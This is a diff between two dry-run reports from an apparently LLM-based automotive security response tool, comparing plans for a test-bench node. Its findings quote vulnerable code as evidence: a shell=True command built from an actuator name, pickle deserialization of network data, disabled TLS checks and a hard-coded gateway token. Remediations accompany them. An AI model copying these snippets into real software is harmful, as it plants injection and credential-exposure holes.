@@ -9,15 +9,15 @@
     "deployment": "examples\\deployments\\03_complex_sdv.yaml"
   },
   "decision": {
-    "summary": "Multiple high-severity findings; one likely active brute-force; topology rule violations.",
+    "summary": "The findings indicate multiple critical vulnerabilities and misconfigurations in the automotive cybersecurity system, including hard-coded secrets, unsafe deserialization, disabled TLS verification, CAN-bus injection attacks, and improper command sources for safety actuators. These issues potentially impact life and bodily health, privacy and personal data, and material and economic resources.",
     "asset_categories_touched": [
-      "Material and Economic Resources",
+      "Life and Bodily Health",
       "Privacy and Personal Data",
-      "Life and Bodily Health"
+      "Material and Economic Resources"
     ],
-    "recommended_tier": "moderate",
-    "confidence": 0.72,
-    "justification": "Authenticated scanner agents flagged 6 findings (3 high, 3 medium); trajectory and action alignment hold; source authorization OK. Tier 'moderate' chosen \u2014 confidence above moderate_threshold (0.65) but below hard (0.85)."
+    "recommended_tier": "hard",
+    "confidence": 0.9,
+    "justification": "The presence of critical vulnerabilities such as hard-coded secrets, unsafe deserialization, and CAN-bus injection attacks directly threaten life and bodily health due to potential unauthorized control over vehicle functions. Privacy and personal data are at risk due to potential unauthorized access and data exfiltration. Material and economic resources are impacted by the potential for unauthorized access and control, leading to financial loss or damage. The combination of these factors, along with the critical nature of the findings, warrants a hard response tier with high confidence."
   },
   "action": {
     "kind": "isolate_node",
@@ -25,32 +25,32 @@
     "parameters": {
       "target": "TESTBENCH-01"
     },
-    "plan_id": "d88dca92-693e-49a7-a496-e593bade04e5"
+    "plan_id": "782be12d-1874-4b0c-b2ce-06f01a875a50"
   },
   "action_report": {
-    "plan_id": "d88dca92-693e-49a7-a496-e593bade04e5",
-    "status": "completed",
-    "summary": "[completed] 26 completed \u00b7 0 failed \u00b7 0 refused \u00b7 0 rolled-back \u00b7 0 skipped. blast_radius=node; assets=['Material and Economic Resources', 'Privacy and Personal Data', 'Life and Bodily Health'].",
-    "started_at": "2026-06-03T15:19:23.155710",
-    "finished_at": "2026-06-03T15:19:23.155710",
+    "plan_id": "782be12d-1874-4b0c-b2ce-06f01a875a50",
+    "status": "failed",
+    "summary": "[failed] 2 completed \u00b7 0 failed \u00b7 1 refused \u00b7 0 rolled-back \u00b7 0 skipped. blast_radius=network; assets=['Life and Bodily Health', 'Privacy and Personal Data', 'Material and Economic Resources'].",
+    "started_at": "2026-06-03T19:42:01.030756",
+    "finished_at": "2026-06-03T19:42:03.127068",
     "tallies": {
       "total": 26,
-      "completed": 26,
+      "completed": 2,
       "failed": 0,
-      "refused": 0,
+      "refused": 1,
       "rolled_back": 0,
       "skipped": 0
     },
     "plan": {
-      "plan_id": "d88dca92-693e-49a7-a496-e593bade04e5",
-      "decision_summary": "Multiple high-severity findings; one likely active brute-force; topology rule violations.",
-      "blast_radius": "node",
+      "plan_id": "782be12d-1874-4b0c-b2ce-06f01a875a50",
+      "decision_summary": "The findings indicate multiple critical vulnerabilities and misconfigurations in the automotive cybersecurity system, including hard-coded secrets, unsafe deserialization, disabled TLS verification, CAN-bus injection attacks, and improper command sources for safety actuators. These issues potentially impact life and bodily health, privacy and personal data, and material and economic resources.",
+      "blast_radius": "network",
       "asset_categories": [
-        "Material and Economic Resources",
+        "Life and Bodily Health",
         "Privacy and Personal Data",
-        "Life and Bodily Health"
+        "Material and Economic Resources"
       ],
-      "created_at": "2026-06-03T15:19:23.155710",
+      "created_at": "2026-06-03T19:42:01.030756",
       "estimated_duration_s": 780,
       "steps": [
         {
@@ -69,11 +69,11 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": true,
-          "step_id": "44c22093-8bbc-4af7-98f2-1320e23dae29",
+          "step_id": "98dca722-e25c-4e4b-8ef5-e13b6dffc925",
           "status": "completed",
           "attempts": 1,
-          "started_at": "2026-06-03T15:19:23.155710",
-          "finished_at": "2026-06-03T15:19:23.155710",
+          "started_at": "2026-06-03T19:42:02.124092",
+          "finished_at": "2026-06-03T19:42:02.124092",
           "output": {
             "dry_run": true,
             "would_invoke": "(no real binary)",
@@ -103,11 +103,11 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": true,
-          "step_id": "a642273f-9e58-4936-9109-5a4ad66c7d8f",
+          "step_id": "5682e7dc-cfbb-48b4-b979-81cb9d8e4220",
           "status": "completed",
           "attempts": 1,
-          "started_at": "2026-06-03T15:19:23.155710",
-          "finished_at": "2026-06-03T15:19:23.155710",
+          "started_at": "2026-06-03T19:42:02.124092",
+          "finished_at": "2026-06-03T19:42:02.125096",
           "output": {
             "dry_run": true,
             "would_invoke": "(no real binary)",
@@ -122,78 +122,31 @@
           "refusal_reason": null
         },
         {
-          "rule_id": "LOG-AUTH-03",
+          "rule_id": "TOP-006",
           "kind": "contain",
-          "tool": "firewall.rate_limit",
+          "tool": "notify.create_incident",
           "params": {
-            "ipv4": "0.0.0.0",
-            "rate_per_minute": 6,
-            "duration_minutes": 30
+            "severity": "critical",
+            "summary": "Secrets store is world-readable",
+            "rule_id": "TOP-006"
           },
-          "description": "rate-limit the suspect source IP",
-          "side_effect": "write",
-          "severity_min": "medium",
-          "timeout_s": 30,
-          "retries": 1,
-          "pre": [],
-          "post": [],
-          "rollback_steps": [],
-          "requires_authorization": true,
-          "step_id": "f8666ad3-a5b8-4ac7-95fd-398a2c792fc2",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:19:23.155710",
-          "finished_at": "2026-06-03T15:19:23.155710",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "ipv4": "0.0.0.0",
-              "rate_per_minute": 6,
-              "duration_minutes": 30
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
-          "error": null,
-          "refusal_reason": null
-        },
-        {
-          "rule_id": "LOG-AUTH-03",
-          "kind": "contain",
-          "tool": "firewall.block_ipv4",
-          "params": {
-            "ipv4": "0.0.0.0",
-            "duration_minutes": 60,
-            "reason": "LOG-AUTH-03"
-          },
-          "description": "block the source IP if attempts continue",
-          "side_effect": "write",
+          "description": "open a critical incident on the secrets store",
+          "side_effect": "read",
           "severity_min": "low",
           "timeout_s": 30,
           "retries": 1,
           "pre": [],
           "post": [],
           "rollback_steps": [],
-          "requires_authorization": true,
-          "step_id": "1751721f-6a7d-4004-9c25-a8375570e115",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:19:23.155710",
-          "finished_at": "2026-06-03T15:19:23.155710",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "netsh",
-            "params": {
-              "ipv4": "0.0.0.0",
-              "duration_minutes": 60,
-              "reason": "LOG-AUTH-03"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "requires_authorization": false,
+          "step_id": "80910fa6-e089-4d09-89aa-0027f503610b",
+          "status": "refused",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
-          "refusal_reason": null
+          "refusal_reason": "H_a judge refused: The action 'alert_only' does not directly contribute to producing a findings report. Alerting the security team may inform them of an issue, but it does not produce a report itself. Additional actions would be needed to compile and document the findings into a report format."
         },
         {
           "rule_id": "CODE-005",
@@ -212,21 +165,12 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "e4b8450a-a40c-488b-a0bf-e2f488ecc4b7",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:19:23.155710",
-          "finished_at": "2026-06-03T15:19:23.155710",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "bandit",
-            "params": {
-              "path": "02_can_gateway.py",
-              "analyser": "auto"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "71185f59-5da2-4694-b585-e9da97c3f8d6",
+          "status": "pending",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
           "refusal_reason": null
         },
@@ -235,7 +179,7 @@
           "kind": "observe",
           "tool": "code.static_scan",
           "params": {
-            "path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\small\\02_can_gateway.py",
+            "path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\CyberLLM\\CyberLLM\\examples\\small\\02_can_gateway.py",
             "analyser": "auto"
           },
           "description": "run a real second-opinion static scanner",
@@ -247,58 +191,12 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "f0949fc4-8ccb-486b-b0d5-58acd5d9922b",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:19:23.155710",
-          "finished_at": "2026-06-03T15:19:23.155710",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "bandit",
-            "params": {
-              "path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\small\\02_can_gateway.py",
-              "analyser": "auto"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
-          "error": null,
-          "refusal_reason": null
-        },
-        {
-          "rule_id": "LOG-AUTH-03",
-          "kind": "observe",
-          "tool": "observe.log_tail",
-          "params": {
-            "path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\logs\\03_can_injection.log",
-            "pattern": "Failed password",
-            "timeout_s": 5
-          },
-          "description": "watch the auth log for 5 s after the rate-limit",
-          "side_effect": "read",
-          "severity_min": "low",
-          "timeout_s": 30,
-          "retries": 1,
-          "pre": [],
-          "post": [],
-          "rollback_steps": [],
-          "requires_authorization": false,
-          "step_id": "b4b51b12-b636-4499-807e-f7b84933ad3b",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:19:23.155710",
-          "finished_at": "2026-06-03T15:19:23.155710",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\logs\\03_can_injection.log",
-              "pattern": "Failed password",
-              "timeout_s": 5
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "32a9bc98-bb6b-4408-a2c9-312750c61970",
+          "status": "pending",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
           "refusal_reason": null
         },
@@ -318,20 +216,12 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": true,
-          "step_id": "7bcea5cd-fafe-44d8-8693-aae8ca9e5cbf",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:19:23.155710",
-          "finished_at": "2026-06-03T15:19:23.155710",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "vault",
-            "params": {
-              "secret_id": "primary-api-token"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "bdde3a17-d94c-43f5-a925-de8a84b97123",
+          "status": "pending",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
           "refusal_reason": null
         },
@@ -354,23 +244,12 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "03fa3d10-197c-49bc-9841-21513c473b1d",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:19:23.155710",
-          "finished_at": "2026-06-03T15:19:23.155710",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "rule_id": "CODE-003",
-              "file": "02_can_gateway.py",
-              "diff": "--- a/02_can_gateway.py\n+++ b/02_can_gateway.py\n@@ secret-load-site @@\n- API_KEY = '<hard-coded-secret>'\n+ import os\n+ API_KEY = os.environ['API_KEY']        # CODE-003 remediation\n",
-              "rationale": "Move secret to env var or secret manager."
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "36e5b1fc-196f-4c53-8f65-a0b403c0374b",
+          "status": "pending",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
           "refusal_reason": null
         },
@@ -393,23 +272,12 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "287314fa-7a3a-4519-a9d1-135b1c733ef1",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:19:23.155710",
-          "finished_at": "2026-06-03T15:19:23.155710",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "rule_id": "CODE-005",
-              "file": "02_can_gateway.py",
-              "diff": "--- a/02_can_gateway.py\n+++ b/02_can_gateway.py\n@@ context-of-finding @@\n# rule_id: CODE-005  (critical)\n# evidence: 02_can_gateway.py: ct:     # CODE-005: pickle.loads on untrusted networ\n# remediation: replace `pickle.loads(b)` with `json.loads(b)` after schema validation.\n",
-              "rationale": "Replace the dangerous construct with the safe equivalent recommended in the rule."
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "8e4af6fd-2fa3-4051-bf25-0d709720dd77",
+          "status": "pending",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
           "refusal_reason": null
         },
@@ -432,23 +300,12 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "07302c84-ee66-4bfb-86b9-6872dab9675b",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:19:23.155710",
-          "finished_at": "2026-06-03T15:19:23.155710",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "rule_id": "CODE-006",
-              "file": "02_can_gateway.py",
-              "diff": "--- a/02_can_gateway.py\n+++ b/02_can_gateway.py\n@@ context-of-finding @@\n# rule_id: CODE-006  (high)\n# evidence: 02_can_gateway.py: t_context()     ctx.check_hostname = False     ctx.verify_mode\n# remediation: remove `verify=False`; provide a CA bundle via `verify='/path/to/ca.pem'`.\n",
-              "rationale": "Auto-generated remediation proposal."
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "98809f99-bf98-4863-affe-9c37343a52a3",
+          "status": "pending",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
           "refusal_reason": null
         },
@@ -458,8 +315,8 @@
           "tool": "code.propose_patch",
           "params": {
             "rule_id": "CODE-001",
-            "file": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\small\\02_can_gateway.py",
-            "diff": "--- a/unknown.py\n+++ b/unknown.py\n@@ context-of-finding @@\n# rule_id: CODE-001  (high)\n# evidence: subprocess.call(user_input, shell=True)\n# remediation: replace `subprocess.call(x, shell=True)` with\n    `subprocess.run(shlex.split(x), check=True)`\n    and validate `x` against an allow-list.\n",
+            "file": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\CyberLLM\\CyberLLM\\examples\\small\\02_can_gateway.py",
+            "diff": "--- a/unknown.py\n+++ b/unknown.py\n@@ context-of-finding @@\n# rule_id: CODE-001  (high)\n# evidence: subprocess.check_output(f\"sysdiag --actuator={actuator_name} --json\", shell=True, text=True)\n# remediation: replace `subprocess.call(x, shell=True)` with\n    `subprocess.run(shlex.split(x), check=True)`\n    and validate `x` against an allow-list.\n",
             "rationale": "Replace the dangerous construct with the safe equivalent recommended in the rule."
           },
           "description": "propose a safe-by-construction patch",
@@ -471,34 +328,23 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "c29e6ee1-e296-48f9-bd08-8dfbb03739d5",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:19:23.155710",
-          "finished_at": "2026-06-03T15:19:23.155710",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "rule_id": "CODE-001",
-              "file": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\small\\02_can_gateway.py",
-              "diff": "--- a/unknown.py\n+++ b/unknown.py\n@@ context-of-finding @@\n# rule_id: CODE-001  (high)\n# evidence: subprocess.call(user_input, shell=True)\n# remediation: replace `subprocess.call(x, shell=True)` with\n    `subprocess.run(shlex.split(x), check=True)`\n    and validate `x` against an allow-list.\n",
-              "rationale": "Replace the dangerous construct with the safe equivalent recommended in the rule."
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "0f1ae0bf-890d-49f6-9d00-6b1f3fb3a8ad",
+          "status": "pending",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
           "refusal_reason": null
         },
         {
-          "rule_id": "CODE-002",
+          "rule_id": "CODE-040",
           "kind": "eradicate",
           "tool": "code.propose_patch",
           "params": {
-            "rule_id": "CODE-002",
-            "file": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\small\\02_can_gateway.py",
-            "diff": "--- a/unknown.py\n+++ b/unknown.py\n@@ context-of-finding @@\n# rule_id: CODE-002  (medium)\n# evidence: hashlib.md5(password)\n# remediation: replace `hashlib.md5(p)` with `argon2.PasswordHasher().hash(p)`.\n",
+            "rule_id": "CODE-040",
+            "file": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\CyberLLM\\CyberLLM\\examples\\small\\02_can_gateway.py",
+            "diff": "--- a/unknown.py\n+++ b/unknown.py\n@@ context-of-finding @@\n# rule_id: CODE-040  (high)\n# evidence: gateway_loop()\n# remediation: follow the rule's remediation guidance.\n",
             "rationale": "Auto-generated remediation proposal."
           },
           "description": "propose a remediation patch",
@@ -510,23 +356,12 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "5d8241f7-17b6-48a6-b19e-beba952a77b9",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:19:23.155710",
-          "finished_at": "2026-06-03T15:19:23.155710",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "rule_id": "CODE-002",
-              "file": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\small\\02_can_gateway.py",
-              "diff": "--- a/unknown.py\n+++ b/unknown.py\n@@ context-of-finding @@\n# rule_id: CODE-002  (medium)\n# evidence: hashlib.md5(password)\n# remediation: replace `hashlib.md5(p)` with `argon2.PasswordHasher().hash(p)`.\n",
-              "rationale": "Auto-generated remediation proposal."
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "df237f40-68f7-48a6-a93a-7b91d7cedf8d",
+          "status": "pending",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
           "refusal_reason": null
         },
@@ -549,23 +384,12 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "aecdfd0f-ff88-46cd-8cd0-0daa2b02da18",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:19:23.155710",
-          "finished_at": "2026-06-03T15:19:23.155710",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "severity": "critical",
-              "summary": "Hard-coded secret in source",
-              "rule_id": "CODE-003",
-              "evidence": "02_can_gateway.py: n-can   GATEWAY_API_TOKEN = \"bmw_gw_8a3f5c1e9d4b7a6f2c8d0e4f7a9b1c3d\"   # CODE-003   @dat"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "99dc51a6-829e-4c02-8a87-1aa9293dc737",
+          "status": "pending",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
           "refusal_reason": null
         },
@@ -588,23 +412,12 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "bd8f5e8f-72be-490d-8559-b0b7f17e26d3",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:19:23.155710",
-          "finished_at": "2026-06-03T15:19:23.155710",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "severity": "critical",
-              "summary": "CODE-005: Unsafe deserialization (pickle / yaml.load / eval)",
-              "rule_id": "CODE-005",
-              "evidence": "02_can_gateway.py: ct:     # CODE-005: pickle.loads on untrusted networ"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "85bf7ec5-3ebb-4bdc-bfb4-6b4f6dda54d1",
+          "status": "pending",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
           "refusal_reason": null
         },
@@ -626,22 +439,12 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "f9479107-a215-4e05-8414-689c528c0be4",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:19:23.155710",
-          "finished_at": "2026-06-03T15:19:23.155710",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "vehicle": "TESTBENCH-01",
-              "message": "Safety-critical bus anomaly detected. Vehicle is in limited mode \u2014 please pull over safely.",
-              "urgency": "critical"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "99010fca-651b-463f-9766-38d34cee66a1",
+          "status": "pending",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
           "refusal_reason": null
         },
@@ -663,22 +466,12 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "a7b3974e-d6cf-4c48-9d4e-7516ebde0d78",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:19:23.155710",
-          "finished_at": "2026-06-03T15:19:23.155710",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "severity": "high",
-              "summary": "CODE-006: TLS certificate verification disabled",
-              "rule_id": "CODE-006"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "ddd44844-9536-4f60-906d-81426a0c5f7b",
+          "status": "pending",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
           "refusal_reason": null
         },
@@ -688,9 +481,9 @@
           "tool": "notify.create_incident",
           "params": {
             "severity": "high",
-            "summary": "CODE-001: Shell-injection sink fed by untrusted input.",
+            "summary": "CODE-001: The use of shell=True with subprocess.check_output allows command injection if a",
             "rule_id": "CODE-001",
-            "evidence": "subprocess.call(user_input, shell=True)"
+            "evidence": "subprocess.check_output(f\"sysdiag --actuator={actuator_name} --json\", shell=True, text=True)"
           },
           "description": "open a code-vulnerability incident",
           "side_effect": "read",
@@ -701,37 +494,25 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "9734ff06-67f1-4e30-abee-d332da69c30e",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:19:23.155710",
-          "finished_at": "2026-06-03T15:19:23.155710",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "severity": "high",
-              "summary": "CODE-001: Shell-injection sink fed by untrusted input.",
-              "rule_id": "CODE-001",
-              "evidence": "subprocess.call(user_input, shell=True)"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "2c8cc726-930d-4137-a54a-0771bd5f7e07",
+          "status": "pending",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
           "refusal_reason": null
         },
         {
-          "rule_id": "LOG-NET-01",
+          "rule_id": "CODE-040",
           "kind": "notify",
           "tool": "notify.create_incident",
           "params": {
             "severity": "high",
-            "summary": "LOG-NET-01: log anomaly",
-            "rule_id": "LOG-NET-01",
-            "evidence": "10.0.0.42 \u2192 10.0.0.255 :7000 burst 1200 pkts/s"
+            "summary": "CODE-040: The gateway_loop function is called without any authentication checks, allowing ",
+            "rule_id": "CODE-040"
           },
-          "description": "open a log-anomaly incident",
+          "description": "open a generic code-vuln incident",
           "side_effect": "read",
           "severity_min": "low",
           "timeout_s": 30,
@@ -740,23 +521,12 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "77ec7a03-4410-4d86-a8d1-03c8639a4863",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:19:23.155710",
-          "finished_at": "2026-06-03T15:19:23.155710",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "severity": "high",
-              "summary": "LOG-NET-01: log anomaly",
-              "rule_id": "LOG-NET-01",
-              "evidence": "10.0.0.42 \u2192 10.0.0.255 :7000 burst 1200 pkts/s"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "77e53340-e27a-4607-9114-ad24c8b933c8",
+          "status": "pending",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
           "refusal_reason": null
         },
@@ -778,22 +548,12 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "1d4b9c29-ffef-4614-bba8-74c781f05878",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:19:23.155710",
-          "finished_at": "2026-06-03T15:19:23.155710",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "severity": "high",
-              "summary": "TOP-001: HPC\u2194ZoneECU must be Ethernet/IEEE-1722",
-              "rule_id": "TOP-001"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "47f7d580-e202-41f5-8587-7670bd53ef85",
+          "status": "pending",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
           "refusal_reason": null
         },
@@ -815,22 +575,12 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "92dcfc03-010a-4dff-8c3f-4ed87b9a175d",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:19:23.155710",
-          "finished_at": "2026-06-03T15:19:23.155710",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "severity": "high",
-              "summary": "TOP-002: External actors must not write to long-term memory",
-              "rule_id": "TOP-002"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "a45e3e7e-d0f0-498d-ba6f-25e3352b0acf",
+          "status": "pending",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
           "refusal_reason": null
         },
@@ -852,35 +602,25 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "0fc4c759-7732-4d29-8bc2-2c3f32a36e05",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:19:23.155710",
-          "finished_at": "2026-06-03T15:19:23.155710",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "severity": "high",
-              "summary": "TOP-007: Brake ECU receives commands from non-brake source",
-              "rule_id": "TOP-007"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "ec467c38-0c0e-4d4c-beb1-ec7021e5a461",
+          "status": "pending",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
           "refusal_reason": null
         },
         {
-          "rule_id": "CODE-002",
+          "rule_id": "TOP-004",
           "kind": "notify",
           "tool": "notify.create_incident",
           "params": {
-            "severity": "medium",
-            "summary": "CODE-002: Weak hash algorithm for password storage.",
-            "rule_id": "CODE-002"
+            "severity": "high",
+            "summary": "TOP-004: topology rule violated",
+            "rule_id": "TOP-004"
           },
-          "description": "open a generic code-vuln incident",
+          "description": "open a topology-violation ticket",
           "side_effect": "read",
           "severity_min": "low",
           "timeout_s": 30,
@@ -889,37 +629,26 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "44b9b14a-a843-4d32-828f-5b06c33b0be1",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:19:23.155710",
-          "finished_at": "2026-06-03T15:19:23.155710",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "severity": "medium",
-              "summary": "CODE-002: Weak hash algorithm for password storage.",
-              "rule_id": "CODE-002"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "7a77134c-3bc6-47a8-b3a7-1bc972b88cfb",
+          "status": "pending",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
           "refusal_reason": null
         },
         {
-          "rule_id": "LOG-AUTH-03",
+          "rule_id": "TOP-005",
           "kind": "notify",
           "tool": "notify.create_incident",
           "params": {
             "severity": "high",
-            "summary": "Brute-force pattern detected",
-            "rule_id": "LOG-AUTH-03",
-            "evidence": "12 failed auth attempts in 30 s, user='root'"
+            "summary": "TOP-005: Datastores must not bind to 0.0.0.0 unless behind PrivateLink. The deployment co",
+            "rule_id": "TOP-005"
           },
-          "description": "open a security-team incident",
-          "side_effect": "write",
+          "description": "raise an architecture-review ticket",
+          "side_effect": "read",
           "severity_min": "low",
           "timeout_s": 30,
           "retries": 1,
@@ -927,23 +656,66 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "6f065d5e-44ce-41f9-8069-131d6be72b81",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:19:23.155710",
-          "finished_at": "2026-06-03T15:19:23.155710",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "severity": "high",
-              "summary": "Brute-force pattern detected",
-              "rule_id": "LOG-AUTH-03",
-              "evidence": "12 failed auth attempts in 30 s, user='root'"
-            },
-            "_status": "would-execute",
-            "_real": false
+          "step_id": "75029c41-c385-4bb7-a869-404c03d4cc9c",
+          "status": "pending",
+          "attempts": 0,
+          "started_at": null,
